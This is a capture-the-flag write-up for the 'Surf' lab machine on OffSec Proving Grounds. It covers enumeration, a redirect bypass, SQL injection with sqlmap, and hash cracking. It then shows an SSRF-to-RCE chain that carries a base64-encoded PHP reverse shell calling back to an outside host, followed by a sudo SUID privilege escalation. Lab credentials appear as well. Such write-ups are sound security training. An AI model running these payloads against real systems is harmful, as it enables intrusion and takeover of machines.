# Surf

## Intro

Surf is a 'get to work' intermediate linux machine from offsec proving grounds.  

## Enum

### Nmap

All tcp port nmap scan.

```
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
```

### Directory fuzzing

The following directories were found.  

```
/js
/assets
/administration
/css
/server-status
```

The following directories and files were found in /administration.  

```
includes
login.php
logout.php
lib
config
assets
forms
customers.php
helpers
console.php
authenticate.php
admin_users.php
index.php
```

### Webroot file path

The following file path was found through an error message.  

`/var/www/server/administration/`


## Forms

The following form adds admin and super admin users.  

`/administration/forms/admin_users_form.php`


The following form adds customer data.  

`/administration/forms/customer_form.php`

The submit button for these forms do not go anywhere, manually creating a POST request is an option.  

Attempting to add an admin and super admin with the following curl command was unsuccessful.  

`curl -s -X 'POST' http://192.168.235.171/administration/forms/admin_users_form.php -d 'user_name=hacker&password=purple&admin_type=admin'`

`curl -s -X 'POST' http://192.168.235.171/administration/forms/admin_users_form.php -d 'user_name=hacker&password=purple&admin_type=super'`


## Customer page

When accessing /administration/customers.php it returns the page but with a 302 found and redirects to the login page.  
If this is caught in burp, the 302 can be changed to 200 and the page can be viewed in the browser.  

The following file is found in the source code.  

`add_customer.php?operation=create`

`export_customers.php`

`edit_customer.php?customer_id=2&operation=edit`

The /administration also can be changed as above.  

Possible sql injection on the sortby and desc search page, going to try again in the future as I have hit a wall with this machine.


## SQL injection

After finding a blind time based injection, the following super admin creds are retrieved using sqlmap.  

```
user: james
password: $2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm
```

Finding a writable directory with sqlmap.  

`sqlmap --url 'http://192.168.217.171/administration/customers.php?search_string=a&filter_col=id&order_by=Desc' -p 'filter_col' --file-write 'shell.php' --file-dest '/var/www/server/'`

So far, I have not been able to find a writable directory to get a sqlmap os shell or command.

## Password cracking

Using the following hashcat command.  

`hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt`


## User shell

After modifying the auth token to read success true, there is a check server functionality that suffers from SSRF.  

It states that phpfusion is the server running internally on 8080. This version is vulnerabile to RCE.  

```
php -r '$sock=fsockopen("192.168.45.186",4444);exec("/bin/sh -i<&3 >&3 2>&3");'  
cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE5Mi4xNjguNDUuMTg2Iiw0NDQ0KTtleGVjKCIvYmluL3NoIC1pPCYzID4mMyAyPiYzIik7JyAg
/infusions/downloads/downloads.php?cat_id=$\{system(base64_decode(cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE5Mi4xNjguNDUuMTg2Iiw0NDQ0KTtleGVjKCIvYmluL3NoIC1pPCYzID4mMyAyPiYzIik7JyAg)).exit\}
```
This payload can be added to the checkserver localhost url to get a reverse shell back.  


## Creds

Database credentials.

```
username: corephpadmin
password: FlyToTheMoon213!
```

These credentials work with the user james and ssh.  


## Priv Esc

After logging in with ssh on the user james account, the following is found after sudo -l command.  

```
(ALL) /usr/bin/php /var/backups/database-backup.php
```
This file is writable by www-data, so the following is written over the file by www-data and executed by james to gain root.  

```
<?php system('chmod +s /bin/bash'); ?>
```

